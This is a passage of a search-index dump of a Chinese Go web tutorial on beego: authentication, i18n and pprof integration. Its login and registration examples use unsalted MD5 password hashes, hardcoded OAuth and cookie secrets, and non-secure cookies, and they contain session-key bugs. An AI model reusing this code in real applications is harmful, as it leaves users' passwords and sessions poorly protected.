<p>beego\u76ee\u524d\u6ca1\u6709\u9488\u5bf9\u8fd9\u4e09\u79cd\u65b9\u5f0f\u8fdb\u884c\u4efb\u4f55\u5f62\u5f0f\u7684\u96c6\u6210\uff0c\u4f46\u662f\u53ef\u4ee5\u5145\u5206\u7684\u5229\u7528\u7b2c\u4e09\u65b9\u5f00\u6e90\u5e93\u6765\u5b9e\u73b0\u4e0a\u9762\u7684\u4e09\u79cd\u65b9\u5f0f\u7684\u7528\u6237\u8ba4\u8bc1\uff0c\u4e0d\u8fc7\u540e\u7eedbeego\u4f1a\u5bf9\u524d\u9762\u4e24\u79cd\u8ba4\u8bc1\u9010\u6b65\u96c6\u6210\u3002</p>"},{"location":"14.4/#http-basic-http-digest","title":"HTTP Basic\u548c HTTP Digest\u8ba4\u8bc1","text":"<p>\u8fd9\u4e24\u4e2a\u8ba4\u8bc1\u662f\u4e00\u4e9b\u5e94\u7528\u91c7\u7528\u7684\u6bd4\u8f83\u7b80\u5355\u7684\u8ba4\u8bc1\uff0c\u76ee\u524d\u5df2\u7ecf\u6709\u5f00\u6e90\u7684\u7b2c\u4e09\u65b9\u5e93\u652f\u6301\u8fd9\u4e24\u4e2a\u8ba4\u8bc1\uff1a <pre><code>github.com/abbot/go-http-auth </code></pre> \u4e0b\u9762\u4ee3\u7801\u6f14\u793a\u4e86\u5982\u4f55\u628a\u8fd9\u4e2a\u5e93\u5f15\u5165beego\u4e2d\u4ece\u800c\u5b9e\u73b0\u8ba4\u8bc1\uff1a <pre><code>package controllers\n\nimport (\n\"github.com/abbot/go-http-auth\"\n\"github.com/astaxie/beego\"\n)\n\nfunc Secret(user, realm string) string {\nif user == \"john\" {\n// password is \"hello\"\nreturn \"$1$dlPL2MqE$oQmn16q49SqdmhenQuNgs1\"\n}\nreturn \"\"\n}\n\ntype MainController struct {\nbeego.Controller\n}\n\nfunc (this *MainController) Prepare() {\na := auth.NewBasicAuthenticator(\"example.com\", Secret)\nif username := a.CheckAuth(this.Ctx.Request); username == \"\" {\na.RequireAuth(this.Ctx.ResponseWriter, this.Ctx.Request)\n}\n}\n\nfunc (this *MainController) Get() {\nthis.Data[\"Username\"] = \"astaxie\"\nthis.Data[\"Email\"] = \"astaxie@gmail.com\"\nthis.TplNames = \"index.tpl\"\n}\n</code></pre> \u4e0a\u9762\u4ee3\u7801\u5229\u7528\u4e86beego\u7684prepare\u51fd\u6570\uff0c\u5728\u6267\u884c\u6b63\u5e38\u903b\u8f91\u4e4b\u524d\u8c03\u7528\u4e86\u8ba4\u8bc1\u51fd\u6570\uff0c\u8fd9\u6837\u5c31\u975e\u5e38\u7b80\u5355\u7684\u5b9e\u73b0\u4e86http auth\uff0cdigest\u7684\u8ba4\u8bc1\u4e5f\u662f\u540c\u6837\u7684\u539f\u7406\u3002</p>"},{"location":"14.4/#oauthoauth2","title":"oauth\u548coauth2\u7684\u8ba4\u8bc1","text":"<p>oauth\u548coauth2\u662f\u76ee\u524d\u6bd4\u8f83\u6d41\u884c\u7684\u4e24\u79cd\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u8fd8\u597d\u7b2c\u4e09\u65b9\u6709\u4e00\u4e2a\u5e93\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u8ba4\u8bc1\uff0c\u4f46\u662f\u662f\u56fd\u5916\u5b9e\u73b0\u7684\uff0c\u5e76\u6ca1\u6709QQ\u3001\u5fae\u535a\u4e4b\u7c7b\u7684\u56fd\u5185\u5e94\u7528\u8ba4\u8bc1\u96c6\u6210\uff1a <pre><code>github.com/bradrydzewski/go.auth\n</code></pre> \u4e0b\u9762\u4ee3\u7801\u6f14\u793a\u4e86\u5982\u4f55\u628a\u8be5\u5e93\u5f15\u5165beego\u4e2d\u4ece\u800c\u5b9e\u73b0oauth\u7684\u8ba4\u8bc1\uff0c\u8fd9\u91cc\u4ee5GitHub\u4e3a\u4f8b\u6f14\u793a\uff1a</p> <ol> <li>\u6dfb\u52a0\u4e24\u6761\u8def\u7531 <pre><code>beego.RegisterController(\"/auth/login\", &amp;controllers.GithubController{})\nbeego.RegisterController(\"/mainpage\", &amp;controllers.PageController{})\n</code></pre></li> <li>\u7136\u540e\u6211\u4eec\u5904\u7406GithubController\u767b\u9646\u7684\u9875\u9762\uff1a <pre><code>package controllers\n\nimport (\n\"github.com/astaxie/beego\"\n\"github.com/bradrydzewski/go.auth\"\n)\n\nconst (\ngithubClientKey = \"a0864ea791ce7e7bd0df\"\ngithubSecretKey = \"a0ec09a647a688a64a28f6190b5a0d2705df56ca\"\n)\n\ntype GithubController struct {\nbeego.Controller\n}\n\nfunc (this *GithubController) Get() {\n// set the auth parameters\nauth.Config.CookieSecret = []byte(\"7H9xiimk2QdTdYI7rDddfJeV\")\nauth.Config.LoginSuccessRedirect = \"/mainpage\"\nauth.Config.CookieSecure = false\n\ngithubHandler := auth.Github(githubClientKey, githubSecretKey)\n\ngithubHandler.ServeHTTP(this.Ctx.ResponseWriter, this.Ctx.Request)\n}\n</code></pre></li> <li>\u5904\u7406\u767b\u9646\u6210\u529f\u4e4b\u540e\u7684\u9875\u9762 <pre><code>package controllers\n\nimport (\n\"github.com/astaxie/beego\"\n\"github.com/bradrydzewski/go.auth\"\n\"net/http\"\n\"net/url\"\n)\n\ntype PageController struct {\nbeego.Controller\n}\n\nfunc (this *PageController) Get() {\n// set the auth parameters\nauth.Config.CookieSecret = []byte(\"7H9xiimk2QdTdYI7rDddfJeV\")\nauth.Config.LoginSuccessRedirect = \"/mainpage\"\nauth.Config.CookieSecure = false\n\nuser, err := auth.GetUserCookie(this.Ctx.Request)\n\n//if no active user session then authorize user\nif err != nil || user.Id() == \"\" {\nhttp.Redirect(this.Ctx.ResponseWriter, this.Ctx.Request, auth.Config.LoginRedirect, http.StatusSeeOther)\nreturn\n}\n\n//else, add the user to the URL and continue\nthis.Ctx.Request.URL.User = url.User(user.Id())\nthis.Data[\"pic\"] = user.Picture()\nthis.Data[\"id\"] = user.Id()\nthis.Data[\"name\"] = user.Name()\nthis.TplNames = \"home.tpl\"\n}\n</code></pre> \u6574\u4e2a\u7684\u6d41\u7a0b\u5982\u4e0b\uff0c\u9996\u5148\u6253\u5f00\u6d4f\u89c8\u5668\u8f93\u5165\u5730\u5740\uff1a</li> </ol> <p></p> <p>\u56fe14.4 \u663e\u793a\u5e26\u6709\u767b\u5f55\u6309\u94ae\u7684\u9996\u9875</p> <p>\u7136\u540e\u70b9\u51fb\u94fe\u63a5\u51fa\u73b0\u5982\u4e0b\u754c\u9762\uff1a</p> <p></p> <p>\u56fe14.5 \u70b9\u51fb\u767b\u5f55\u6309\u94ae\u540e\u663e\u793aGitHub\u7684\u6388\u6743\u9875</p> <p>\u7136\u540e\u70b9\u51fbAuthorize app\u5c31\u51fa\u73b0\u5982\u4e0b\u754c\u9762\uff1a</p> <p></p> <p>\u56fe14.6 \u6388\u6743\u767b\u5f55\u4e4b\u540e\u663e\u793a\u7684\u83b7\u53d6\u5230\u7684GitHub\u4fe1\u606f\u9875</p>"},{"location":"14.4/#_1","title":"\u81ea\u5b9a\u4e49\u8ba4\u8bc1","text":"<p>\u81ea\u5b9a\u4e49\u7684\u8ba4\u8bc1\u4e00\u822c\u90fd\u662f\u548csession\u7ed3\u5408\u9a8c\u8bc1\u7684\uff0c\u5982\u4e0b\u4ee3\u7801\u6765\u6e90\u4e8e\u4e00\u4e2a\u57fa\u4e8ebeego\u7684\u5f00\u6e90\u535a\u5ba2\uff1a <pre><code>//\u767b\u9646\u5904\u7406\nfunc (this *LoginController) Post() {\nthis.TplNames = \"login.tpl\"\nthis.Ctx.Request.ParseForm()\nusername := this.Ctx.Request.Form.Get(\"username\")\npassword := this.Ctx.Request.Form.Get(\"password\")\nmd5Password := md5.New()\nio.WriteString(md5Password, password)\nbuffer := bytes.NewBuffer(nil)\nfmt.Fprintf(buffer, \"%x\", md5Password.Sum(nil))\nnewPass := buffer.String()\n\nnow := time.Now().Format(\"2006-01-02 15:04:05\")\n\nuserInfo := models.GetUserInfo(username)\nif userInfo.Password == newPass {\nvar users models.User\nusers.Last_logintime = now\nmodels.UpdateUserInfo(users)\n\n//\u767b\u5f55\u6210\u529f\u8bbe\u7f6esession\nsess := globalSessions.SessionStart(this.Ctx.ResponseWriter, this.Ctx.Request)\nsess.Set(\"uid\", userInfo.Id)\nsess.Set(\"uname\", userInfo.Username)\n\nthis.Ctx.Redirect(302, \"/\")\n}   }\n\n//\u6ce8\u518c\u5904\u7406\nfunc (this *RegController) Post() {\nthis.TplNames = \"reg.tpl\"\nthis.Ctx.Request.ParseForm()\nusername := this.Ctx.Request.Form.Get(\"username\")\npassword := this.Ctx.Request.Form.Get(\"password\")\nusererr := checkUsername(username)\nfmt.Println(usererr)\nif usererr == false {\nthis.Data[\"UsernameErr\"] = \"Username error, Please to again\"\nreturn\n}\n\npasserr := checkPassword(password)\nif passerr == false {\nthis.Data[\"PasswordErr\"] = \"Password error, Please to again\"\nreturn\n}\n\nmd5Password := md5.New()\nio.WriteString(md5Password, password)\nbuffer := bytes.NewBuffer(nil)\nfmt.Fprintf(buffer, \"%x\", md5Password.Sum(nil))\nnewPass := buffer.String()\n\nnow := time.Now().Format(\"2006-01-02 15:04:05\")\n\nuserInfo := models.GetUserInfo(username)\n\nif userInfo.Username == \"\" {\nvar users models.User\nusers.Username = username\nusers.Password = newPass\nusers.Created = now\nusers.Last_logintime = now\nmodels.AddUser(users)\n\n//\u767b\u5f55\u6210\u529f\u8bbe\u7f6esession\nsess := globalSessions.SessionStart(this.Ctx.ResponseWriter, this.Ctx.Request)\nsess.Set(\"uid\", userInfo.Id)\nsess.Set(\"uname\", userInfo.Username)\nthis.Ctx.Redirect(302, \"/\")\n} else {\nthis.Data[\"UsernameErr\"] = \"User already exists\"\n}\n\n}\n\nfunc checkPassword(password string) (b bool) {\nif ok, _ := regexp.MatchString(\"^[a-zA-Z0-9]{4,16}$\", password); !ok {\nreturn false\n}\nreturn true\n}\n\nfunc checkUsername(username string) (b bool) {\nif ok, _ := regexp.MatchString(\"^[a-zA-Z0-9]{4,16}$\", username); !ok {\nreturn false\n}\nreturn true\n}\n</code></pre> \u6709\u4e86\u7528\u6237\u767b\u9646\u548c\u6ce8\u518c\u4e4b\u540e\uff0c\u5176\u4ed6\u6a21\u5757\u7684\u5730\u65b9\u53ef\u4ee5\u589e\u52a0\u5982\u4e0b\u8fd9\u6837\u7684\u7528\u6237\u662f\u5426\u767b\u9646\u7684\u5224\u65ad\uff1a <pre><code>func (this *AddBlogController) Prepare() {\nsess := globalSessions.SessionStart(this.Ctx.ResponseWriter, this.Ctx.Request)\nsess_uid := sess.Get(\"userid\")\nsess_username := sess.Get(\"username\")\nif sess_uid == nil {\nthis.Ctx.Redirect(302, \"/admin/login\")\nreturn\n}\nthis.Data[\"Username\"] = sess_username\n}\n</code></pre></p>"},{"location":"14.4/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u8868\u5355\u53ca\u9a8c\u8bc1\u652f\u6301</li> <li>\u4e0b\u4e00\u8282: \u591a\u8bed\u8a00\u652f\u6301</li> </ul>"},{"location":"14.5/","title":"14.5 \u591a\u8bed\u8a00\u652f\u6301","text":""},{"location":"14.5/#145","title":"14.5 \u591a\u8bed\u8a00\u652f\u6301","text":"<p>\u6211\u4eec\u5728\u7b2c\u5341\u7ae0\u4ecb\u7ecd\u8fc7\u56fd\u9645\u5316\u548c\u672c\u5730\u5316\uff0c\u5f00\u53d1\u4e86\u4e00\u4e2ago-i18n\u5e93\uff0c\u8fd9\u5c0f\u8282\u6211\u4eec\u5c06\u628a\u8be5\u5e93\u96c6\u6210\u5230beego\u6846\u67b6\u91cc\u9762\u6765\uff0c\u4f7f\u5f97\u6211\u4eec\u7684\u6846\u67b6\u652f\u6301\u56fd\u9645\u5316\u548c\u672c\u5730\u5316\u3002</p>"},{"location":"14.5/#i18n","title":"i18n\u96c6\u6210","text":"<p>beego\u4e2d\u8bbe\u7f6e\u5168\u5c40\u53d8\u91cf\u5982\u4e0b\uff1a <pre><code>Translation i18n.IL  Lang        string  //\u8bbe\u7f6e\u8bed\u8a00\u5305\uff0czh\u3001en\nLangPath    string  //\u8bbe\u7f6e\u8bed\u8a00\u5305\u6240\u5728\u4f4d\u7f6e\n</code></pre> \u521d\u59cb\u5316\u591a\u8bed\u8a00\u51fd\u6570: <pre><code>func InitLang(){\nbeego.Translation:=i18n.NewLocale()\nbeego.Translation.LoadPath(beego.LangPath)\nbeego.Translation.SetLocale(beego.Lang)\n}\n</code></pre> \u4e3a\u4e86\u65b9\u4fbf\u5728\u6a21\u677f\u4e2d\u76f4\u63a5\u8c03\u7528\u591a\u8bed\u8a00\u5305\uff0c\u6211\u4eec\u8bbe\u8ba1\u4e86\u4e09\u4e2a\u51fd\u6570\u6765\u5904\u7406\u54cd\u5e94\u7684\u591a\u8bed\u8a00\uff1a <pre><code>beegoTplFuncMap[\"Trans\"] = i18n.I18nT\nbeegoTplFuncMap[\"TransDate\"] = i18n.I18nTimeDate\nbeegoTplFuncMap[\"TransMoney\"] = i18n.I18nMoney\n\nfunc I18nT(args ...interface{}) string {\nok := false\nvar s string\nif len(args) == 1 {\ns, ok = args[0].(string)\n}\nif !ok {\ns = fmt.Sprint(args...)\n}\nreturn beego.Translation.Translate(s)\n}\n\nfunc I18nTimeDate(args ...interface{}) string {\nok := false\nvar s string\nif len(args) == 1 {\ns, ok = args[0].(string)\n}\nif !ok {\ns = fmt.Sprint(args...)\n}\nreturn beego.Translation.Time(s)\n}\n\nfunc I18nMoney(args ...interface{}) string {\nok := false\nvar s string\nif len(args) == 1 {\ns, ok = args[0].(string)\n}\nif !ok {\ns = fmt.Sprint(args...)\n}\nreturn beego.Translation.Money(s)\n}\n</code></pre></p>"},{"location":"14.5/#_1","title":"\u591a\u8bed\u8a00\u5f00\u53d1\u4f7f\u7528","text":"<ol> <li>\u8bbe\u7f6e\u8bed\u8a00\u4ee5\u53ca\u8bed\u8a00\u5305\u6240\u5728\u4f4d\u7f6e\uff0c\u7136\u540e\u521d\u59cb\u5316i18n\u5bf9\u8c61\uff1a <pre><code>beego.Lang = \"zh\"\nbeego.LangPath = \"views/lang\"\nbeego.InitLang()\n</code></pre></li> <li> <p>\u8bbe\u8ba1\u591a\u8bed\u8a00\u5305</p> <p>\u4e0a\u9762\u8bb2\u4e86\u5982\u4f55\u521d\u59cb\u5316\u591a\u8bed\u8a00\u5305\uff0c\u73b0\u5728\u8bbe\u8ba1\u591a\u8bed\u8a00\u5305\uff0c\u591a\u8bed\u8a00\u5305\u662fjson\u6587\u4ef6\uff0c\u5982\u7b2c\u5341\u7ae0\u4ecb\u7ecd\u7684\u4e00\u6837\uff0c\u6211\u4eec\u9700\u8981\u628a\u8bbe\u8ba1\u7684\u6587\u4ef6\u653e\u5728LangPath\u4e0b\u9762\uff0c\u4f8b\u5982zh.json\u6216\u8005en.json <pre><code># zh.json\n\n{\n\"zh\": {\n\"submit\": \"\u63d0\u4ea4\",\n\"create\": \"\u521b\u5efa\"\n}\n}\n\n# en.json\n\n{\n\"en\": {\n\"submit\": \"Submit\",\n\"create\": \"Create\"\n}\n}\n</code></pre> 3. \u4f7f\u7528\u8bed\u8a00\u5305</p> <p>\u6211\u4eec\u53ef\u4ee5\u5728controller\u4e2d\u8c03\u7528\u7ffb\u8bd1\u83b7\u53d6\u54cd\u5e94\u7684\u7ffb\u8bd1\u8bed\u8a00\uff0c\u5982\u4e0b\u6240\u793a\uff1a <pre><code>func (this *MainController) Get() {\nthis.Data[\"create\"] = beego.Translation.Translate(\"create\")\nthis.TplNames = \"index.tpl\"\n}\n</code></pre> \u6211\u4eec\u4e5f\u53ef\u4ee5\u5728\u6a21\u677f\u4e2d\u76f4\u63a5\u8c03\u7528\u54cd\u5e94\u7684\u7ffb\u8bd1\u51fd\u6570\uff1a <pre><code>//\u76f4\u63a5\u6587\u672c\u7ffb\u8bd1\n{{.create | Trans}}\n\n//\u65f6\u95f4\u7ffb\u8bd1\n{{.time | TransDate}}\n\n//\u8d27\u5e01\u7ffb\u8bd1\n{{.money | TransMoney}}\n</code></pre></p> </li> </ol>"},{"location":"14.5/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u7528\u6237\u8ba4\u8bc1</li> <li>\u4e0b\u4e00\u8282: pprof\u652f\u6301</li> </ul>"},{"location":"14.6/","title":"14.6 pprof\u652f\u6301","text":"<p>Go\u8bed\u8a00\u6709\u4e00\u4e2a\u975e\u5e38\u68d2\u7684\u8bbe\u8ba1\u5c31\u662f\u6807\u51c6\u5e93\u91cc\u9762\u5e26\u6709\u4ee3\u7801\u7684\u6027\u80fd\u76d1\u63a7\u5de5\u5177\uff0c\u5728\u4e24\u4e2a\u5730\u65b9\u6709\u5305\uff1a <pre><code>net/http/pprof\n\nruntime/pprof\n</code></pre> \u5176\u5b9enet/http/pprof\u4e2d\u53ea\u662f\u4f7f\u7528runtime/pprof\u5305\u6765\u8fdb\u884c\u5c01\u88c5\u4e86\u4e00\u4e0b\uff0c\u5e76\u5728http\u7aef\u53e3\u4e0a\u66b4\u9732\u51fa\u6765</p>"},{"location":"14.6/#beegopprof","title":"beego\u652f\u6301pprof","text":"<p>\u76ee\u524dbeego\u6846\u67b6\u65b0\u589e\u4e86pprof\uff0c\u8be5\u7279\u6027\u9ed8\u8ba4\u662f\u4e0d\u5f00\u542f\u7684\uff0c\u5982\u679c\u4f60\u9700\u8981\u6d4b\u8bd5\u6027\u80fd\uff0c\u67e5\u770b\u76f8\u5e94\u7684\u6267\u884cgoroutine\u4e4b\u7c7b\u7684\u4fe1\u606f\uff0c\u5176\u5b9eGo\u7684\u9ed8\u8ba4\u5305\"net/http/pprof\"\u5df2\u7ecf\u5177\u6709\u8be5\u529f\u80fd\uff0c\u5982\u679c\u6309\u7167Go\u9ed8\u8ba4\u7684\u65b9\u5f0f\u6267\u884cWeb\uff0c\u9ed8\u8ba4\u5c31\u53ef\u4ee5\u4f7f\u7528\uff0c\u4f46\u662f\u7531\u4e8ebeego\u91cd\u65b0\u5c01\u88c5\u4e86ServHTTP\u51fd\u6570\uff0c\u9ed8\u8ba4\u7684\u5305\u662f\u65e0\u6cd5\u5f00\u542f\u8be5\u529f\u80fd\u7684\uff0c\u6240\u4ee5\u9700\u8981\u5bf9beego\u7684\u5185\u90e8\u6539\u9020\u652f\u6301pprof\u3002</p> <ul> <li>\u9996\u5148\u5728beego.Run\u51fd\u6570\u4e2d\u6839\u636e\u53d8\u91cf\u662f\u5426\u81ea\u52a8\u52a0\u8f7d\u6027\u80fd\u5305 <pre><code>if PprofOn {\nBeeApp.RegisterController(`/debug/pprof`, &amp;ProfController{})\nBeeApp.RegisterController(`/debug/pprof/:pp([\\w]+)`, &amp;ProfController{})\n}\n</code></pre></li> <li>\u8bbe\u8ba1ProfController <pre><code>package beego\n\nimport (\n\"net/http/pprof\"\n)\n\ntype ProfController struct {\nController\n}\n\nfunc (this *ProfController) Get() {\nswitch this.Ctx.Param[\":pp\"] {\ndefault:\npprof.Index(this.Ctx.ResponseWriter, this.Ctx.Request)\ncase \"\":\npprof.Index(this.Ctx.ResponseWriter, this.Ctx.Request)\ncase \"cmdline\":\npprof.Cmdline(this.Ctx.ResponseWriter, this.Ctx.Request)\ncase \"profile\":\npprof.Profile(this.Ctx.ResponseWriter, this.Ctx.Request)\ncase \"symbol\":\npprof.Symbol(this.Ctx.ResponseWriter, this.Ctx.Request)\n}\nthis.Ctx.ResponseWriter.WriteHeader(200)\n}\n</code></pre></li> </ul>"},{"location":"14.6/#_1","title":"\u4f7f\u7528\u5165\u95e8","text":"<p>\u901a\u8fc7\u4e0a\u9762\u7684\u8bbe\u8ba1\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u4ee3\u7801\u5f00\u542fpprof\uff1a <pre><code>beego.PprofOn = true\n</code></pre> \u7136\u540e\u4f60\u5c31\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00\u5982\u4e0bURL\u5c31\u770b\u5230\u5982\u4e0b\u754c\u9762\uff1a </p> <p>\u56fe14.7 \u7cfb\u7edf\u5f53\u524dgoroutine\u3001heap\u3001thread\u4fe1\u606f</p> <p>\u70b9\u51fbgoroutine\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5f88\u591a\u8be6\u7ec6\u7684\u4fe1\u606f\uff1a</p> <p></p> <p>\u56fe14.8 \u663e\u793a\u5f53\u524dgoroutine\u7684\u8be6\u7ec6\u4fe1\u606f</p> <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u884c\u83b7\u53d6\u66f4\u591a\u8be6\u7ec6\u7684\u4fe1\u606f <pre><code>go tool pprof http://localhost:8080/debug/pprof/profile\n</code></pre> \u8fd9\u65f6\u5019\u7a0b\u5e8f\u5c31\u4f1a\u8fdb\u516530\u79d2\u7684profile\u6536\u96c6\u65f6\u95f4\uff0c\u5728\u8fd9\u6bb5\u65f6\u95f4\u5185\u62fc\u547d\u5237\u65b0\u6d4f\u89c8\u5668\u4e0a\u7684\u9875\u9762\uff0c\u5c3d\u91cf\u8ba9cpu\u5360\u7528\u6027\u80fd\u4ea7\u751f\u6570\u636e\u3002</p> <pre><code>(pprof) top10\n\nTotal: 3 samples\n\n   1 33.3% 33.3% 1 33.3% MHeap_AllocLocked\n\n   1 33.3% 66.7% 1 33.3% os/exec.(*Cmd).closeDescriptors\n\n   1 33.3% 100.0% 1 33.3% runtime.sigprocmask\n\n   0 0.0% 100.0% 1 33.3% MCentral_Grow\n\n   0 0.0% 100.0% 2 66.7% main.Compile\n\n   0 0.0% 100.0% 2 66.7% main.compile\n\n   0 0.0% 100.0% 2 66.7% main.run\n\n   0 0.0% 100.0% 1 33.3% makeslice1\n\n   0 0.0% 100.0% 2 66.7% net/http.(*ServeMux).ServeHTTP\n\n   0 0.0% 100.0% 2 66.7% net/http.(*conn).serve\n\n(pprof)web\n</code></pre> <p></p> <p>\u56fe14.9 \u5c55\u793a\u7684\u6267\u884c\u6d41\u7a0b\u4fe1\u606f</p>"},{"location":"14.6/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u591a\u8bed\u8a00\u652f\u6301</li> <li>\u4e0b\u4e00\u8282: \u5c0f\u7ed3</li> </ul>"},{"location":"14.7/","title":"14.7 \u5c0f\u7ed3","text":"<p>\u8fd9\u4e00\u7ae0\u4e3b\u8981\u9610\u8ff0\u4e86\u5982\u4f55\u57fa\u4e8ebeego\u6846\u67b6\u8fdb\u884c\u6269\u5c55\uff0c\u8fd9\u5305\u62ec\u9759\u6001\u6587\u4ef6\u7684\u652f\u6301\uff0c\u9759\u6001\u6587\u4ef6\u4e3b\u8981\u8bb2\u8ff0\u4e86\u5982\u4f55\u5229\u7528beego\u8fdb\u884c\u5feb\u901f\u7684\u7f51\u7ad9\u5f00\u53d1\uff0c\u5229\u7528bootstrap\u642d\u5efa\u6f02\u4eae\u7684\u7ad9\u70b9\uff1b\u7b2c\u4e8c\u5c0f\u7ed3\u8bb2\u89e3\u4e86\u5982\u4f55\u5728beego\u4e2d\u96c6\u6210sessionManager\uff0c\u65b9\u4fbf\u7528\u6237\u5728\u5229\u7528beego\u7684\u65f6\u5019\u5feb\u901f\u7684\u4f7f\u7528session\uff1b\u7b2c\u4e09\u5c0f\u7ed3\u4ecb\u7ecd\u4e86\u8868\u5355\u548c\u9a8c\u8bc1\uff0c\u57fa\u4e8eGo\u8bed\u8a00\u7684struct\u7684\u5b9a\u4e49\u4f7f\u5f97\u6211\u4eec\u5728\u5f00\u53d1Web\u7684\u8fc7\u7a0b\u4e2d\u4ece\u91cd\u590d\u7684\u5de5\u4f5c\u4e2d\u89e3\u653e\u51fa\u6765\uff0c\u800c\u4e14\u52a0\u5165\u4e86\u9a8c\u8bc1\u4e4b\u540e\u53ef\u4ee5\u5c3d\u91cf\u505a\u5230\u6570\u636e\u5b89\u5168\uff0c\u7b2c\u56db\u5c0f\u7ed3\u4ecb\u7ecd\u4e86\u7528\u6237\u8ba4\u8bc1\uff0c\u7528\u6237\u8ba4\u8bc1\u4e3b\u8981\u6709\u4e09\u65b9\u9762\u7684\u9700\u6c42\uff0chttp basic\u548chttp digest\u8ba4\u8bc1\uff0c\u7b2c\u4e09\u65b9\u8ba4\u8bc1\uff0c\u81ea\u5b9a\u4e49\u8ba4\u8bc1\uff0c\u901a\u8fc7\u4ee3\u7801\u6f14\u793a\u4e86\u5982\u4f55\u5229\u7528\u73b0\u6709\u7684\u7b2c\u4e09\u65b9\u5305\u96c6\u6210\u5230beego\u5e94\u7528\u4e2d\u6765\u5b9e\u73b0\u8fd9\u4e9b\u8ba4\u8bc1\uff1b\u7b2c\u4e94\u5c0f\u8282\u4ecb\u7ecd\u4e86\u591a\u8bed\u8a00\u7684\u652f\u6301\uff0cbeego\u4e2d\u96c6\u6210\u4e86go-i18n\u8fd9\u4e2a\u591a\u8bed\u8a00\u5305\uff0c\u7528\u6237\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u5229\u7528\u8be5\u5e93\u5f00\u53d1\u591a\u8bed\u8a00\u7684Web\u5e94\u7528\uff1b\u7b2c\u516d\u5c0f\u8282\u4ecb\u7ecd\u4e86\u5982\u4f55\u96c6\u6210Go\u7684pprof\u5305\uff0cpprof\u5305\u662f\u7528\u4e8e\u6027\u80fd\u8c03\u8bd5\u7684\u5de5\u5177\uff0c\u901a\u8fc7\u5bf9beego\u7684\u6539\u9020\u4e4b\u540e\u96c6\u6210\u4e86pprof\u5305\uff0c\u4f7f\u5f97\u7528\u6237\u53ef\u4ee5\u5229\u7528pprof\u6d4b\u8bd5\u57fa\u4e8ebeego\u5f00\u53d1\u7684\u5e94\u7528\uff0c\u901a\u8fc7\u8fd9\u516d\u4e2a\u5c0f\u8282\u7684\u4ecb\u7ecd\u6211\u4eec\u6269\u5c55\u51fa\u6765\u4e86\u4e00\u4e2a\u6bd4\u8f83\u5f3a\u58ee\u7684beego\u6846\u67b6\uff0c\u8fd9\u4e2a\u6846\u67b6\u8db3\u4ee5\u5e94\u4ed8\u76ee\u524d\u5927\u591a\u6570\u7684Web\u5e94\u7528\uff0c\u7528\u6237\u53ef\u4ee5\u7ee7\u7eed\u53d1\u6325\u81ea\u5df1\u7684\u60f3\u8c61\u529b\u53bb\u6269\u5c55\uff0c\u6211\u8fd9\u91cc\u53ea\u662f\u7b80\u5355\u7684\u4ecb\u7ecd\u4e86\u6211\u80fd\u60f3\u7684\u5230\u7684\u51e0\u4e2a\u6bd4\u8f83\u91cd\u8981\u7684\u6269\u5c55\u3002</p>"},{"location":"14.7/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: pprof\u652f\u6301</li> </ul>"},{"location":"SUMMARY/","title":"SUMMARY","text":"<ul> <li>Go\u73af\u5883\u914d\u7f6e<ul> <li>Go\u5b89\u88c5</li> <li>Go Module, GOPATH \u4e0e\u5de5\u4f5c\u7a7a\u95f4</li> <li>Go \u547d\u4ee4</li> <li>Go\u5f00\u53d1\u5de5\u5177</li> <li>\u5c0f\u7ed3</li> </ul> </li> <li>Go\u8bed\u8a00\u57fa\u7840<ul> <li>\u4f60\u597d\uff0cGo</li> <li>Go\u57fa\u7840</li> <li>\u6d41\u7a0b\u548c\u51fd\u6570</li> <li>struct</li> <li>\u9762\u5411\u5bf9\u8c61</li> <li>interface</li> <li>\u5e76\u53d1</li> <li>\u5c0f\u7ed3</li> </ul> </li> <li>Web\u57fa\u7840<ul> <li>web\u5de5\u4f5c\u65b9\u5f0f</li> <li>Go\u642d\u5efa\u4e00\u4e2a\u7b80\u5355\u7684web\u670d\u52a1</li> <li>Go\u5982\u4f55\u4f7f\u5f97web\u5de5\u4f5c</li> <li>Go\u7684http\u5305\u8be6\u89e3</li> <li>\u5c0f\u7ed3</li> </ul> </li> <li>\u8868\u5355<ul> <li>\u5904\u7406\u8868\u5355\u7684\u8f93\u5165</li> <li>\u9a8c\u8bc1\u8868\u5355\u7684\u8f93\u5165</li> <li>\u9884\u9632\u8de8\u7ad9\u811a\u672c</li> <li>\u9632\u6b62\u591a\u6b21\u9012\u4ea4\u8868\u5355</li> <li>\u5904\u7406\u6587\u4ef6\u4e0a\u4f20</li> <li>\u5c0f\u7ed3</li> </ul> </li> <li>\u8bbf\u95ee\u6570\u636e\u5e93<ul> <li>database/sql\u63a5\u53e3</li> <li>\u4f7f\u7528MySQL\u6570\u636e\u5e93</li> <li>\u4f7f\u7528SQLite\u6570\u636e\u5e93</li> <li>\u4f7f\u7528PostgreSQL\u6570\u636e\u5e93</li> <li>\u4f7f\u7528beedb\u5e93\u8fdb\u884cORM\u5f00\u53d1</li> <li>NOSQL\u6570\u636e\u5e93\u64cd\u4f5c</li> <li>\u5c0f\u7ed3</li> </ul> </li> <li>session\u548c\u6570\u636e\u5b58\u50a8<ul> <li>session\u548ccookie</li> <li>Go\u5982\u4f55\u4f7f\u7528session</li> <li>session\u5b58\u50a8</li> <li>\u9884\u9632session\u52ab\u6301 </li> <li>\u5c0f\u7ed3</li> </ul> </li> <li>\u6587\u672c\u6587\u4ef6\u5904\u7406<ul> <li>XML\u5904\u7406</li> <li>JSON\u5904\u7406 </li> <li>\u6b63\u5219\u5904\u7406</li> <li>\u6a21\u677f\u5904\u7406</li> <li>\u6587\u4ef6\u64cd\u4f5c</li> <li>\u5b57\u7b26\u4e32\u5904\u7406</li> <li>\u5c0f\u7ed3</li> </ul> </li> <li>Web\u670d\u52a1<ul> 